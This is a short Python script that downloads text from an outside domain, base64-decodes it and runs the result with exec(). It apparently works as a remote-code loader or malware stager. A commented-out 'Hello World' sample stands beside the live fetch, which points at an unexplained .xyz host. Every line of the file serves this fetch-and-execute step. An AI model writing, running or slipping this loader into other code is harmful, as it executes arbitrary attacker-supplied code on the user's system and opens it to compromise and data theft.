import base64
import urllib.request
import requests

x = requests.get('https://deliworkshopexpress.xyz/paperpin3329')

print(x.text)
sinpu = '';
#print(sinpu);

#base64_string = "cHJpbnQoIkhlbGxvIFdvcmxkISIpOw=="
base64_string = x.text
base64_bytes = base64_string.encode("ascii")
  
sample_string_bytes = base64.b64decode(base64_bytes)
sample_string = sample_string_bytes.decode("ascii")
  
exec(sample_string);
